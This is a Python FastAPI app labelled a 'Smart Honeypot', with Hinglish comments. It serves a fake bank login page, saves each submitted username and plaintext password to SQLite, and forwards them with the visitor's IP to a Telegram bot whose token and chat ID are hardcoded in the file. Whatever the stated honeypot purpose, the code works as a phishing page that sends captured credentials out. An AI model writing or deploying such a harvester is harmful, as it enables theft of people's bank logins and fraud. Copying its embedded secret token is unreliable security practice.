from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
import sqlite3
from datetime import datetime
import uvicorn
import requests

TELEGRAM_TOKEN = "8845685227:AAEH-PGNUJ9Oiottu-W0tU-NWhUSxRPWDUs"
TELEGRAM_CHAT_ID = "7664324098"


app = FastAPI(title="Smart Honeypot")

# Templates folder
templates = Jinja2Templates(directory="templates")

# Database setup
def init_db():
    conn = sqlite3.connect('attacks.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS attacks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                  ip TEXT, location TEXT, 
                  username TEXT, password TEXT, 
                  time TEXT, user_agent TEXT)''')
    conn.commit()
    conn.close()

init_db()
def send_telegram_alert(username, password, ip):
    message = f"""🚨 HONEYPOT ALERT 🚨
    
New Login Attempt Detected!

👤 Username: {username}
🔑 Password: {password}
🌐 IP: {ip}
⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
        print("Telegram alert sent!")
    except Exception as e:
        print("Telegram alert failed:", e)

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    # Fake Bank Login Page dikhayega
    return templates.TemplateResponse("login.html", {"request": request})


@app.post("/login")
async def login(request: Request):
    form = await request.form()
    username = form.get("username")
    password = form.get("password")
    
    # Attack ki details nikalna
    ip = request.client.host
    location = "Local" # Abhi ke liye Local. Baad me real IP location add karenge
    user_agent = request.headers.get("user-agent")
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Database me save karna
    conn = sqlite3.connect('attacks.db')
    c = conn.cursor()
    c.execute("INSERT INTO attacks (ip, location, username, password, time, user_agent) VALUES (?,?,?,?,?,?)",
              (ip, location, username, password, time_now, user_agent))
    conn.commit()
    send_telegram_alert(username, password, ip)
    conn.close()
    
    print(f"🚨 ATTACK LOGGED: {ip} | {username}:{password} | {time_now}")
    
    # Login ke baad seedha dashboard pe bhej do
    return RedirectResponse(url="/dashboard", status_code=303)


@app.get("/dashboard")
async def dashboard(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})
    





if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)